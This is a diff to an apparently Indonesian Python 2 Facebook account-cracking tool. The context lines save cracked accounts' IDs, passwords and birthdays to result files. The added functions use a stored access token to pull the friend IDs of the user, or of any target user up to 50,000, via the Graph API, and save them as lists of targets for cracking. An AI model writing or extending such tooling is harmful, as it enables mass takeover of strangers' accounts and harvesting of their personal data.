@@ -349,6 +349,7 @@ def menu():
 	print" \033[1;96m[\033[1;97m03\033[1;96m] \033[1;97mCrack dari likes postingan publik"
 	print" \033[1;96m[\033[1;97m04\033[1;96m] \033[1;97mCek hasil crack"
 	print" \033[1;96m[\033[1;97m05\033[1;96m] \033[1;97mCek konfirmasi identitas account facebook"
+	print" \033[1;96m[\033[1;97m06\033[1;96m] \033[1;97mCek ID"
 	print" \033[1;97m[\033[1;96m00\033[1;97m] \033[1;96mRemove TOKEN/COOKIE"
 	print
 	pilih_india()
@@ -408,7 +409,7 @@ def pilih_india():
 		print
 		print" \033[1;96m[\033[1;97m1\033[1;96m]\033[1;97m lihat hasil \033[1;97m[\033[1;96mOK\033[1;97m]"
 		print" \033[1;96m[\033[1;97m2\033[1;96m]\033[1;97m lihat hasil \033[1;96m[\033[1;97mCP\033[1;96m]"
-		ress = raw_input(" \033[1;96m[\033[1;97m?\033[1;96m]\033[1;97m pilih : ")
+		ress = raw_input(" \033[1;96m[\033[1;97m?\033[1;96m]\033[1;96m pilih \033[1;96m:\033[1;93m ")
 		if ress =="":
 			menu()
 		elif ress == "1" or ress == "01":
@@ -421,10 +422,20 @@ def pilih_india():
 			exit()
 	elif ask == "5" or ask == "05":
 		buatngecek()
-	elif ask == "0" or ask == "00":
-		os.system("rm -f login.txt") 
-		print (" √   berhasil menghapus token") 
-		exit()
+	elif ask == "6" or ask == "06":
+		print
+		print("\033[1;96m [\033[1;97m1\033[1;96m]\033[1;97m Cek ID publik ")
+		print("\033[1;96m [\033[1;97m2\033[1;96m]\033[1;97m Cek ID followers ")
+		d = raw_input("\n\033[1;96m [\033[1;97m?\033[1;96m] \033[1;96mpilih \033[1;96m:\033[1;93m ")
+		if d =='': 
+			exit()
+		elif d in['1','01']:
+			id_teman()
+		elif d in['2','02']:
+			idfrom_teman()
+		else:
+			print ("\033[1;97m     pilih yang benar.......!!!") 
+			exit()	
 	else:
 		print ("     \033[1;97mpilih yang benar.......!!!") 
 		exit()
@@ -560,20 +571,20 @@ def manual():
 						data = s.get(url).json()
 						nama = data['name']
 						ttl = data['birthday'].replace("/","-")
-						print('\r\033[0;97m 👉 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m ' +uid+ ' \033[1;92m◊\033[1;97m ' + asu + ' \033[1;92m◊\033[1;97m ' + ttl)
+						print('\r\033[1;97m 👉 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m ' +uid+ ' \033[1;92m◊\033[1;97m ' + asu + ' \033[1;92m◊\033[1;97m ' + ttl)
 						cp.append(uid+'|'+asu+'|'+ttl)
 						save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a')
-						save.write('\033[0;97m 👉 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m '+str(uid)+' \033[1;96m◊\033[1;97m '+str(pw)+'\n')
+						save.write('\033[1;97m 👉 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m '+str(uid)+' \033[1;96m◊\033[1;97m '+str(pw)+'\n')
 						open("CP/%s.txt"%(tanggal),"a").write("%s|%s|%s\n"%(uid, asu, ttl))
 						save.close()
 						break
 					except(KeyError, IOError):
 						ttl = ' '
 					except:pass
-					print '\r\033[0;97m 👉 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m ' +uid+ ' \033[1;96m◊\033[1;97m ' + asu + '        '
+					print '\r\033[1;97m 👉 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m ' +uid+ ' \033[1;96m◊\033[1;97m ' + asu + '        '
 					cp.append(uid+'|'+asu)
 					save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a')
-					save.write('\033[0;97m 👉 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m '+str(uid)+' \033[1;96m◊\033[1;97m '+str(pw)+'\n')
+					save.write('\033[1;97m 👉 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m '+str(uid)+' \033[1;96m◊\033[1;97m '+str(pw)+'\n')
 					open("CP/%s.txt"%(tanggal),"a").write(" %s|%s\n"%(uid, asu))
 					save.close()
 					break
@@ -595,6 +606,154 @@ def buat_folder():
 	try:os.mkdir("OK")
 	except:pass
 
+def jalan(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.03)
+
+back = 0
+threads = []
+id = []
+idteman = []
+idfromteman = []
+	
+def id_teman():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print ' Token invalid'
+        os.system('rm -rf login.txt')
+        time.sleep(0.01)
+        masuk()
+
+    try:
+        os.mkdir('out')
+    except OSError:
+        pass
+
+    try:
+        os.system('clear')
+        print
+	print
+        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
+        z = json.loads(r.text)
+        print('\033[1;96m[\033[1;97m!\033[1;96m] \033[1;97mMENGAMBIL SEMUA \033[1;96mID \033[1;97mTEMAN')
+	print('\033[1;97mjika ingin berhenti mengambil ID tekan \033[1;95mctrl \033[1;97m+\033[1;95m z')
+	jalan("\033[1;96m¤"*48)
+        print
+        bz = open('out/id_teman.txt', 'w')
+        for a in z['data']:
+            idteman.append(a['id'])
+            bz.write(a['id'] + '\n')
+            print '\r\x1b[1;96m [\x1b[1;97m•\x1b[1;96m] \x1b[1;97m' + str(len(idteman)) + '  \033[1;96m◊\033[1;97m ',
+            sys.stdout.flush()
+            time.sleep(0.005)
+            print '\x1b[1;97m' + a['id']
+
+        bz.close()
+        print '\n\x1b[1;97m [\x1b[1;96m\xe2\x9c\x93\x1b[1;97m] \33[3;1m\x1b[1;96msukses mengambil ID\33[0;1m '
+        print '\r\33[0;1m\x1b[1;97m [\x1b[1;96m\xe2\x80\xa2\x1b[1;97m] \33[3;1m\x1b[1;96mtotal ID\x1b[1;97m :\x1b[1;93m %s' % len(idteman)
+        done = raw_input('\r\33[0;1m\x1b[1;97m [\x1b[1;96m\xe2\x80\xa2\x1b[1;97m] \33[3;1m\x1b[1;96msimpan nama file\x1b[1;97m : \x1b[1;93m')
+        os.rename('out/id_teman.txt', 'out/' + done)
+        print '\r\33[0;1m\x1b[1;97m [\x1b[1;96m\xe2\x80\xa2\x1b[1;97m] \33[3;1m\x1b[1;96mfile tersimpan \x1b[1;97m: \x1b[1;93mout/' + done
+	print
+        exit()
+    except IOError:
+        print '\33[0;1m\x1b[1;97m [\x1b[1;96m!\x1b[1;97m] \33[3;1m\x1b[1;96mgagal membuat file'
+	print
+        exit()
+    except (KeyboardInterrupt, EOFError):
+        print '\33[0;1m\x1b[1;97m [\x1b[1;96m!\x1b[1;97m] \33[3;1m\x1b[1;96mterhenti ! '
+	print
+        exit()
+    except KeyError:
+        print '\33[0;1m\x1b[1;97m [\x1b[1;96m!\x1b[1;97m] \33[3;1m\x1b[1;96mgagal '
+	print
+        exit()
+    except OSError:
+        print '\33[0;1m\x1b[1;97m [\x1b[1;96m!\x1b[1;97m] \33[3;1m\x1b[1;96mfile anda tidak tersimpan !'
+	print
+        exit()
+    except requests.exceptions.ConnectionError:
+        print '\33[0;1m\x1b[1;97m [\x1b[1;96m!\x1b[1;97m] \33[3;1m\x1b[1;96mTidak ada koneksi !'
+	print
+        exit()
+	
+def idfrom_teman():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print ' Token Invalid'
+        os.system('rm -rf login.txt')
+        time.sleep(0.01)
+        masuk()
+
+    try:
+        os.mkdir('out')
+    except OSError:
+        pass
+
+    try:
+        os.system('clear')
+        print
+	print
+        idt = raw_input('\x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mUser ID Target : \033[1;93m')
+        try:
+            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
+            op = json.loads(jok.text)
+            print '\x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mNama Akun      : \x1b[1;93m' + op['name']
+        except KeyError:
+            print ' \x1b[1;91mID Publik Tidak Ada !'
+            raw_input('\n\x1b[1;93m[\x1b[1;91mKembali\x1b[1;93m]')
+            dump()
+
+        r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(50000)&access_token=' + toket)
+        z = json.loads(r.text)
+        print('\033[1;96m[\033[1;97m!\033[1;96m] \033[1;97mMENGAMBIL SEMUA \033[1;96mID \033[1;97mTEMAN')
+	print('\033[1;97mjika ingin berhenti mengambil ID tekan \033[1;95mctrl \033[1;97m+\033[1;95m z')
+	jalan("\033[1;96m¤"*48)
+        print
+        bz = open('out/id_teman_from_teman.txt', 'w')
+        for a in z['friends']['data']:
+            idfromteman.append(a['id'])
+            bz.write(a['id'] + '\n')
+            print '\r\x1b[1;96m [\x1b[1;97m•\x1b[1;96m] \x1b[1;97m' + str(len(idfromteman)) + '  \033[1;96m◊\033[1;97m ',
+            sys.stdout.flush()
+            time.sleep(0.005)
+            print '\x1b[1;97m' + a['id']
+
+        bz.close()
+        print '\n\x1b[1;97m [\x1b[1;96m\xe2\x9c\x93\x1b[1;97m] \33[3;1m\x1b[1;96msukses mengambil ID\33[0;1m '
+        print '\r\33[0;1m\x1b[1;97m [\x1b[1;96m\xe2\x80\xa2\x1b[1;97m] \33[3;1m\x1b[1;96mtotal ID\x1b[1;97m :\x1b[1;93m %s' % len(idfromteman)
+        done = raw_input('\r\33[0;1m\x1b[1;97m [\x1b[1;96m\xe2\x80\xa2\x1b[1;97m] \33[3;1m\x1b[1;96msimpan nama file\x1b[1;97m : \x1b[1;93m')
+        os.rename('out/id_teman_from_teman.txt', 'out/' + done)
+        print '\r\33[0;1m\x1b[1;97m [\x1b[1;96m\xe2\x80\xa2\x1b[1;97m] \33[3;1m\x1b[1;96mfile tersimpan \x1b[1;97m: \x1b[1;93mout/' + done
+	print
+        exit()
+    except IOError:
+        print '\33[0;1m\x1b[1;97m [\x1b[1;96m!\x1b[1;97m] \33[3;1m\x1b[1;96mgagal membuat file'
+	print
+        exit()
+    except (KeyboardInterrupt, EOFError):
+        print '\33[0;1m\x1b[1;97m [\x1b[1;96m!\x1b[1;97m] \33[3;1m\x1b[1;96mterhenti ! '
+	print
+        exit()
+    except KeyError:
+        print '\33[0;1m\x1b[1;97m [\x1b[1;96m!\x1b[1;97m] \33[3;1m\x1b[1;96mgagal '
+	print
+        exit()
+    except OSError:
+        print '\33[0;1m\x1b[1;97m [\x1b[1;96m!\x1b[1;97m] \33[3;1m\x1b[1;96mfile anda tidak tersimpan !'
+	print
+        exit()
+    except requests.exceptions.ConnectionError:
+        print '\33[0;1m\x1b[1;97m [\x1b[1;96m!\x1b[1;97m] \33[3;1m\x1b[1;96mTidak ada koneksi !'
+	print
+        exit()		
+			
 def tik():
     titik = [
      '.   ', '..  ', '... ']
